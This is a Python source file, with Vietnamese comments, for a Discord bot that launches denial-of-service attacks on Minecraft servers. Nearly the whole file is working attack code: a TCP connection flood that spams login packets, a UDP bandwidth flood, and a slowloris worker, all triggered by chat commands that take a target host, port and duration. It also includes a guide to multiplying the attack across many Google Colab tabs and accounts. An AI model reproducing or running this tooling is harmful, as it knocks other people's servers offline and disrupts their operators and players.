#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DISCORD BOT DDOS MINECRAFT - TỐI ƯU CHO SERVER 300 NGƯỜI
# KẾT HỢP TCP FLOOD + UDP FLOOD + CONNECTION POOL + PACKET SPAM
# CHẠY TRÊN RENDER 24/7 + KHUYẾN CÁO MỞ THÊM COLAB

import discord
from discord.ext import commands
import asyncio
import socket
import struct
import random
import time
import sys
import os
import json
import uuid
import hashlib
import threading
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from flask import Flask

# ╔══════════════════════════════════════════════════════════╗
# ║   LƯU Ý QUAN TRỌNG                                      ║
# ║   1. Server 300 người chơi thường có anti-DDoS cơ bản   ║
# ║   2. Render 512MB RAM chỉ chạy được ~300 connections    ║
# ║   3. ĐỂ DDOS HIỆU QUẢ: MỞ 5-10 TAB COLAB CHẠY CÙNG LÚC ║
# ║   4. Server dùng TCPShield/Cloudflare -> BÓ TAY         ║
# ║   5. CHỈ DDOS ĐƯỢC SERVER OFFLINE MODE                  ║
# ║   6. KHÔNG CHỊU TRÁCH NHIỆM VỀ VIỆC SỬ DỤNG            ║
# ╚══════════════════════════════════════════════════════════╝

# ============================================
# FLASK KEEP ALIVE
# ============================================
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px;">
    <h1>💣 DDOS BOT ONLINE</h1>
    <p>Server 300 người chơi? ĐỊT MẸ NÓ!</p>
    </body></html>
    """

@app.route('/ping')
def ping():
    return "🏓 Pong!"

def start_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=start_web, daemon=True).start()

# ============================================
# CONFIG DISCORD
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "TOKEN_VAO_DAY")
PREFIX = "!"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ============================================
# DDOS STATS
# ============================================
ddos_stats = {
    "active_attacks": [],
    "total_packets": 0,
    "total_connections": 0,
    "total_bytes": 0,
    "attack_count": 0
}

# ============================================
# CẤU HÌNH DDOS - CHỈNH Ở ĐÂY
# ============================================
MAX_TCP_CONNECTIONS = 300      # TỐI ĐA CHO RENDER 512MB
MAX_UDP_THREADS = 5            # UDP FLOOD THREADS
PACKETS_PER_CONNECTION = 100   # PACKET GỬI MỖI LẦN
RECONNECT_DELAY = 0.05         # DELAY KẾT NỐI LẠI
PROTOCOL_VERSION = 759         # MINECRAFT 1.19.2

# ============================================
# MINECRAFT PROTOCOL HELPERS
# ============================================
def encode_varint(value):
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def create_handshake(host, port, protocol=759, next_state=2):
    try:
        host_bytes = host.encode('utf-8')
        data = bytearray()
        data.extend(encode_varint(protocol))
        data.extend(encode_varint(len(host_bytes)))
        data.extend(host_bytes)
        data.extend(struct.pack('>H', port))
        data.extend(encode_varint(next_state))
        
        packet = bytearray()
        packet.extend(encode_varint(len(data) + 1))
        packet.extend(encode_varint(0x00))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

def create_login(username):
    try:
        user_bytes = username.encode('utf-8')
        offline_uuid = hashlib.md5(f"OfflinePlayer:{username}".encode()).digest()
        
        data = bytearray()
        data.extend(encode_varint(0x00))
        data.extend(encode_varint(len(user_bytes)))
        data.extend(user_bytes)
        data.append(0x01)
        data.extend(offline_uuid)
        
        packet = bytearray()
        packet.extend(encode_varint(len(data)))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

def create_chat_spam(message):
    """TẠO PACKET CHAT SPAM - NẾU BOT JOIN ĐƯỢC SERVER"""
    try:
        msg_bytes = message.encode('utf-8')
        data = bytearray()
        data.extend(encode_varint(0x03))
        data.extend(encode_varint(len(msg_bytes)))
        data.extend(msg_bytes)
        data.append(0x00)
        
        packet = bytearray()
        packet.extend(encode_varint(len(data)))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

def create_keep_alive(keep_alive_id=0):
    """GIỮ KẾT NỐI KHÔNG TIMEOUT"""
    try:
        data = bytearray()
        data.extend(encode_varint(0x0F))
        data.extend(struct.pack('>Q', keep_alive_id))
        
        packet = bytearray()
        packet.extend(encode_varint(len(data)))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

# ============================================
# DDOS WORKERS
# ============================================
def tcp_connection_pool_worker(host, port, duration, stop_event, worker_id):
    """TCP CONNECTION POOL - GIỮ NHIỀU KẾT NỐI MỞ"""
    global ddos_stats
    connections = []
    start_time = time.time()
    
    # TẠO CONNECTION POOL
    for i in range(MAX_TCP_CONNECTIONS // 5):  # Chia cho 5 workers
        if stop_event.is_set() or time.time() - start_time > duration:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((host, port))
            
            handshake = create_handshake(host, port, PROTOCOL_VERSION)
            if handshake:
                sock.send(handshake)
                connections.append(sock)
                ddos_stats["total_connections"] += 1
        except:
            pass
    
    if not connections:
        return 0
    
    # SPAM PACKET LIÊN TỤC
    packets_sent = 0
    round_num = 0
    
    while not stop_event.is_set() and time.time() - start_time < duration:
        dead_conns = []
        
        for sock in connections:
            try:
                # GỬI NHIỀU LOGIN PACKET
                for _ in range(PACKETS_PER_CONNECTION):
                    username = f"DDOS_{worker_id}_{round_num}_{random.randint(0,999999)}"
                    login_pkt = create_login(username)
                    if login_pkt:
                        sock.send(login_pkt)
                        packets_sent += 1
                        ddos_stats["total_packets"] += 1
                
                # GỬI KEEP ALIVE ĐỂ GIỮ KẾT NỐI
                keep_alive_pkt = create_keep_alive(random.randint(0, 999999))
                if keep_alive_pkt:
                    sock.send(keep_alive_pkt)
                    
            except (socket.error, BrokenPipeError, ConnectionResetError, OSError):
                dead_conns.append(sock)
        
        # THAY THẾ KẾT NỐI CHẾT
        for dead in dead_conns:
            try:
                dead.close()
                connections.remove(dead)
            except:
                pass
            
            if not stop_event.is_set() and time.time() - start_time < duration:
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(3)
                    new_sock.connect((host, port))
                    handshake = create_handshake(host, port, PROTOCOL_VERSION)
                    if handshake:
                        new_sock.send(handshake)
                        connections.append(new_sock)
                        ddos_stats["total_connections"] += 1
                except:
                    pass
        
        round_num += 1
        time.sleep(0.01)  # DELAY NHỎ
    
    # CLEANUP
    for sock in connections:
        try:
            sock.close()
        except:
            pass
    
    return packets_sent

def udp_flood_worker(host, port, duration, stop_event, worker_id):
    """UDP FLOOD - TẤN CÔNG BĂNG THÔNG"""
    global ddos_stats
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # TẠO PACKET LỚN
        garbage = bytearray(65500)
        for i in range(65500):
            garbage[i] = random.randint(0, 255)
        
        start_time = time.time()
        bytes_sent = 0
        
        while not stop_event.is_set() and time.time() - start_time < duration:
            for _ in range(50):
                sock.sendto(garbage, (host, port))
                bytes_sent += 65500
                ddos_stats["total_bytes"] += 65500
            
            time.sleep(0.001)
        
        sock.close()
        return bytes_sent
        
    except Exception as e:
        return 0

def slowloris_worker(host, port, duration, stop_event):
    """SLOWLORIS ATTACK - GIỮ KẾT NỐI MỞ LÂU"""
    connections = []
    start_time = time.time()
    
    # MỞ KẾT NỐI VÀ GIỮ CHÚNG MỞ
    for i in range(50):
        if stop_event.is_set():
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(duration + 10)
            sock.connect((host, port))
            
            # GỬI HANDSHAKE NHƯNG KHÔNG HOÀN THÀNH
            handshake = create_handshake(host, port, PROTOCOL_VERSION)
            if handshake:
                # GỬI TỪNG PHẦN NHỎ ĐỂ GIỮ KẾT NỐI
                sock.send(handshake[:10])
                time.sleep(5)
                sock.send(handshake[10:20])
                time.sleep(5)
                connections.append(sock)
        except:
            pass
    
    # GIỮ KẾT NỐI ĐẾN HẾT THỜI GIAN
    while not stop_event.is_set() and time.time() - start_time < duration:
        for sock in connections:
            try:
                sock.send(b'\x00')  # GỬI BYTE RỖNG GIỮ KẾT NỐI
            except:
                pass
        time.sleep(10)
    
    for sock in connections:
        try:
            sock.close()
        except:
            pass

# ============================================
# DISCORD COMMANDS
# ============================================
@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   💣 DDOS BOT - TỐI ƯU SERVER 300 NGƯỜI                ║
║   TÊN: {bot.user.name}                                  ║
║   PREFIX: {PREFIX}                                             ║
║   MAX TCP: {MAX_TCP_CONNECTIONS} connections                          ║
║   UDP THREADS: {MAX_UDP_THREADS}                                        ║
║   CHẠY TRÊN RENDER 24/7                                 ║
║                                                        ║
║   ⚠️  ĐỂ DDOS MẠNH HƠN: MỞ THÊM COLAB!                 ║
╚══════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"🔥 {PREFIX}ddos | Server 300 player"
        )
    )

@bot.command(name="ddos")
async def ddos_command(ctx, host: str = None, port: int = 25565, duration: int = 120):
    """
    💣 DDOS SERVER MINECRAFT (TỐI ƯU 300 NGƯỜI)
    CÁCH DÙNG: !ddos <ip> <port> <giây>
    VÍ DỤ: !ddos svmine.net 25565 180
    """
    if not host:
        embed = discord.Embed(
            title="❌ **THIẾU THÔNG TIN**",
            color=0xff0000,
            description="Nhập đúng cú pháp: `!ddos <ip> <port> <thời_gian>`\nVí dụ: `!ddos svmine.net 25565 180`"
        )
        await ctx.send(embed=embed)
        return
    
    if duration > 600:
        duration = 600
    if duration < 10:
        duration = 60
    
    embed = discord.Embed(
        title="💣 **BẮT ĐẦU DDOS SERVER**",
        color=0xff0000,
        description=f"ĐỊT MẸ `{host}:{port}` TRONG {duration} GIÂY!"
    )
    embed.add_field(name="🎯 MỤC TIÊU", value=f"```{host}:{port}```", inline=True)
    embed.add_field(name="⏱️ THỜI GIAN", value=f"```{duration}s```", inline=True)
    embed.add_field(name="🔌 MAX CONNECTIONS", value=f"```{MAX_TCP_CONNECTIONS}```", inline=True)
    embed.add_field(name="📦 PACKETS/CONN", value=f"```{PACKETS_PER_CONNECTION}```", inline=True)
    embed.add_field(name="👤 NGƯỜI DÙNG", value=ctx.author.mention, inline=True)
    embed.add_field(name="💀 TRẠNG THÁI", value="```ĐANG KHỞI ĐỘNG TẤN CÔNG...```", inline=False)
    embed.add_field(
        name="⚠️ LƯU Ý",
        value="```1. Server có TCPShield/Cloudflare -> VÔ DỤNG\n2. Mở thêm Colab để tăng sức mạnh\n3. !stopddos để dừng\n4. !colab để xem hướng dẫn mở rộng```",
        inline=False
    )
    embed.set_footer(text="💀 DDOS BOT v2.0 | ĐỊT MẸ SERVER 300 NGƯỜI")
    
    msg = await ctx.send(embed=embed)
    
    # TẠO STOP EVENT
    stop_event = threading.Event()
    ddos_stats["active_attacks"].append(stop_event)
    ddos_stats["attack_count"] += 1
    
    # CHẠY DDOS TRONG THREADPOOL
    loop = asyncio.get_event_loop()
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=MAX_TCP_CONNECTIONS // 50 + MAX_UDP_THREADS + 5) as executor:
        # TCP CONNECTION POOL WORKERS
        tcp_tasks = []
        for i in range(5):
            task = loop.run_in_executor(
                executor,
                tcp_connection_pool_worker,
                host, port, duration, stop_event, i
            )
            tcp_tasks.append(task)
        
        # UDP FLOOD WORKERS
        udp_tasks = []
        for i in range(MAX_UDP_THREADS):
            task = loop.run_in_executor(
                executor,
                udp_flood_worker,
                host, port, duration, stop_event, i
            )
            udp_tasks.append(task)
        
        # SLOWLORIS WORKER
        slow_task = loop.run_in_executor(
            executor,
            slowloris_worker,
            host, port, duration, stop_event
        )
        
        # CẬP NHẬT TRẠNG THÁI
        while time.time() - start_time < duration:
            if stop_event.is_set():
                break
            
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            # TÍNH TOÁN HIỆU SUẤT
            pps = ddos_stats["total_packets"] / max(elapsed, 1)
            mbps = (ddos_stats["total_bytes"] * 8) / max(elapsed, 1) / 1000000
            
            try:
                embed.set_field_at(
                    5,
                    name="💀 TRẠNG THÁI TẤN CÔNG",
                    value=f"```⚡ PACKETS: {ddos_stats['total_packets']:,}\n"
                          f"📦 PACKETS/S: {pps:.0f}\n"
                          f"🔌 CONNECTIONS: {ddos_stats['total_connections']}\n"
                          f"📡 BANDWIDTH: {mbps:.1f} Mbps\n"
                          f"⏱️ CÒN: {remaining}s / {duration}s```",
                    inline=False
                )
                await msg.edit(embed=embed)
            except:
                pass
            
            await asyncio.sleep(3)
        
        # CHỜ HOÀN THÀNH
        all_tasks = tcp_tasks + udp_tasks + [slow_task]
        await asyncio.gather(*all_tasks, return_exceptions=True)
    
    elapsed = int(time.time() - start_time)
    pps = ddos_stats["total_packets"] / max(elapsed, 1)
    
    embed = discord.Embed(
        title="✅ **DDOS HOÀN THÀNH!**",
        color=0x00ff00,
        description=f"ĐÃ ĐỊT `{host}:{port}` TRONG {elapsed}S!"
    )
    embed.add_field(name="📦 TỔNG PACKETS", value=f"```{ddos_stats['total_packets']:,}```", inline=True)
    embed.add_field(name="📡 PACKETS/S", value=f"```{pps:.0f}```", inline=True)
    embed.add_field(name="🔌 CONNECTIONS", value=f"```{ddos_stats['total_connections']}```", inline=True)
    embed.add_field(name="📊 BANDWIDTH", value=f"```{ddos_stats['total_bytes']/1000000:.1f} MB```", inline=True)
    embed.add_field(name="⏱️ THỜI GIAN", value=f"```{elapsed}s```", inline=True)
    embed.add_field(
        name="⚠️ KHUYẾN CÁO",
        value="```Nếu server chưa lag: MỞ THÊM COLAB!\nGõ !colab để xem hướng dẫn```",
        inline=False
    )
    
    await msg.edit(embed=embed)
    
    if stop_event in ddos_stats["active_attacks"]:
        ddos_stats["active_attacks"].remove(stop_event)

@bot.command(name="lag")
async def lag_command(ctx, host: str = None, port: int = 25565):
    """🐌 LAG NHANH 90 GIÂY"""
    if not host:
        await ctx.send("❌ `!lag <ip> <port>`")
        return
    
    await ctx.invoke(ddos_command, host=host, port=port, duration=90)

@bot.command(name="stopddos")
async def stop_ddos(ctx):
    """🛑 DỪNG DDOS"""
    count = len(ddos_stats["active_attacks"])
    for ev in ddos_stats["active_attacks"]:
        ev.set()
    ddos_stats["active_attacks"].clear()
    
    embed = discord.Embed(
        title="🛑 **ĐÃ DỪNG!**",
        color=0xffff00,
        description=f"Đã dừng {count} cuộc tấn công!"
    )
    await ctx.send(embed=embed)

@bot.command(name="ddosstats")
async def stats_ddos(ctx):
    """📊 THỐNG KÊ"""
    embed = discord.Embed(title="📊 **THỐNG KÊ DDOS**", color=0x00ffff)
    embed.add_field(name="💣 SỐ LẦN", value=f"`{ddos_stats['attack_count']}`", inline=True)
    embed.add_field(name="📦 PACKETS", value=f"`{ddos_stats['total_packets']:,}`", inline=True)
    embed.add_field(name="🔌 CONNS", value=f"`{ddos_stats['total_connections']}`", inline=True)
    embed.add_field(name="📡 DATA", value=f"`{ddos_stats['total_bytes']/1000000:.1f} MB`", inline=True)
    embed.add_field(name="⚡ ĐANG CHẠY", value=f"`{len(ddos_stats['active_attacks'])}`", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="colab")
async def colab_guide(ctx):
    """📘 HƯỚNG DẪN MỞ COLAB TĂNG SỨC MẠNH"""
    embed = discord.Embed(
        title="📘 **HƯỚNG DẪN MỞ RỘNG DDOS**",
        color=0x0000ff,
        description="ĐỂ DDOS ĐƯỢC SERVER 300 NGƯỜI, CẦN MỞ THÊM COLAB:"
    )
    embed.add_field(
        name="1️⃣ VÀO COLAB",
        value="https://colab.research.google.com",
        inline=False
    )
    embed.add_field(
        name="2️⃣ TẠO NOTEBOOK MỚI",
        value="File -> New Notebook",
        inline=False
    )
    embed.add_field(
        name="3️⃣ PASTE CODE DDOS",
        value="```python\n!pip install discord.py\n# Copy code bot vào đây\n# HOẶC chạy script DDoS riêng```",
        inline=False
    )
    embed.add_field(
        name="4️⃣ NHÂN BẢN TAB",
        value="Ctrl+Click vào tab để duplicate\nMở 10-20 tab cùng lúc!",
        inline=False
    )
    embed.add_field(
        name="5️⃣ CHẠY ĐỒNG THỜI",
        value="Mỗi tab = thêm 300 connections\n10 tab = 3000 connections!\n20 tab = 6000 connections!",
        inline=False
    )
    embed.add_field(
        name="⚠️ LƯU Ý",
        value="Colab chạy 12h rồi ngắt\nPhải mở lại tab mới\nDùng nhiều tài khoản Google",
        inline=False
    )
    embed.set_footer(text="💀 CÀNG NHIỀU TAB -> CÀNG MẠNH -> SERVER CÀNG LAG")
    await ctx.send(embed=embed)

@bot.command(name="helpme")
async def help_cmd(ctx):
    """❓ HELP"""
    embed = discord.Embed(
        title="🤖 **DDOS BOT - HƯỚNG DẪN**",
        color=0x0000ff,
        description="ĐỊT MẸ ĐỌC KỸ!"
    )
    embed.add_field(name="💣 `!ddos <ip> <port> <giây>`", value="DDoS server\nVD: `!ddos sv.net 25565 180`", inline=False)
    embed.add_field(name="🐌 `!lag <ip> <port>`", value="Lag nhanh 90s\nVD: `!lag sv.net 25565`", inline=False)
    embed.add_field(name="🛑 `!stopddos`", value="Dừng DDoS", inline=False)
    embed.add_field(name="📊 `!ddosstats`", value="Thống kê", inline=False)
    embed.add_field(name="📘 `!colab`", value="Hướng dẫn mở rộng", inline=False)
    embed.add_field(
        name="⚠️ QUAN TRỌNG",
        value="```- Server có TCPShield/Cloudflare -> KHÔNG DDOS ĐƯỢC\n"
              "- Server offline mode -> DỄ DDOS\n"
              "- Mở 10+ tab Colab để đủ sức DDoS server 300 người\n"
              "- KHÔNG CHỊU TRÁCH NHIỆM!```",
        inline=False
    )
    await ctx.send(embed=embed)

# ============================================
# CHẠY BOT
# ============================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║   💣 DISCORD DDOS BOT - SERVER 300 NGƯỜI               ║
║                                                        ║
║   !ddos <ip> <port> <giây>  - DDoS                     ║
║   !lag <ip> <port>          - Lag nhanh                ║
║   !stopddos                 - Dừng                      ║
║   !ddosstats                - Thống kê                  ║
║   !colab                    - Hướng dẫn mở rộng         ║
║   !helpme                   - Help                      ║
║                                                        ║
║   ⚠️  MỞ 10-20 TAB COLAB ĐỂ ĐỦ SỨC DDOS!               ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    bot.run(BOT_TOKEN)
